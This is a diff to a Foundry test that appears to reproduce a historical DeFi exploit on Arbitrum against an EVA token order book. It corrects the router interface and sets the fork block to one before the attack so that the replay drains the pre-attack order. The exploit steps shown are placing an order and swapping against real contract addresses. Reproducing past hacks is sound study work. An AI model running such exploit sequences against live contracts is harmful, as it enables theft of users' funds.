@@ -37,8 +37,37 @@ interface ISwapRouter {
     function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
 }
 
+// UniV3_Router (0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45) is a SwapRouter02-style
+// router: its ExactInputSingleParams struct has NO `deadline` field (7 fields, not 8).
+// Calling it with the classic 8-field ISwapRouter struct silently misencodes the
+// calldata (shifts every field after `recipient`) and the call reverts with no
+// reason. Confirmed against the real historical attack tx via `cast run`, which
+// decodes this router's call as the 7-field variant.
+interface IV3SwapRouterNoDeadline {
+    struct ExactInputSingleParams {
+        address tokenIn;
+        address tokenOut;
+        uint24 fee;
+        address recipient;
+        uint256 amountIn;
+        uint256 amountOutMinimum;
+        uint160 sqrtPriceLimitX96;
+    }
+
+    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
+}
+
 contract EVA is BaseTestWithBalanceLog {
-    uint256 blocknumToForkFrom = 373990723; //373990723
+    // NOTE: fork block is the attack block MINUS ONE, not 373990723 itself.
+    // Foundry's createSelectFork(url, N) uses eth_call semantics for state at N,
+    // which is state AFTER block N's transactions execute. The real attack tx was
+    // txIndex 9 of block 373990723, so forking AT 373990723 yields POST-attack
+    // state (order book already drained from 100,000 -> 40,000 EVA), causing this
+    // PoC to under-fill and revert with insufficient EVA balance on the second
+    // swap. Forking at 373990722 (the parent block) restores the pristine
+    // pre-attack 100,000 EVA resting order. Verified via eth_call balanceOf at
+    // both blocks against a live Arbitrum archive endpoint.
+    uint256 blocknumToForkFrom = 373990722; //373990723
 
     IERC20 wbtc = IERC20(0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f);
     IERC20 eva = IERC20(0x45D9831d8751B2325f3DBf48db748723726e1C8c);
@@ -69,15 +98,14 @@ contract EVA is BaseTestWithBalanceLog {
         orderbook.addNewOrder(pairId, quantity, price, isBuy, timestamp);
 
         
-        Uni_Router_V3(UniV3_Router).exactInputSingle(
-            Uni_Router_V3.ExactInputSingleParams({
+        IV3SwapRouterNoDeadline(UniV3_Router).exactInputSingle(
+            IV3SwapRouterNoDeadline.ExactInputSingleParams({
                 tokenIn: address(eva),
                 tokenOut: address(wbtc),
                 fee: 10000,
                 recipient: address(this),
                 amountIn: 30000000000000000000000,
                 amountOutMinimum: 0,
-                deadline: block.timestamp + 100,
                 sqrtPriceLimitX96: 0}));
 
         ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams({
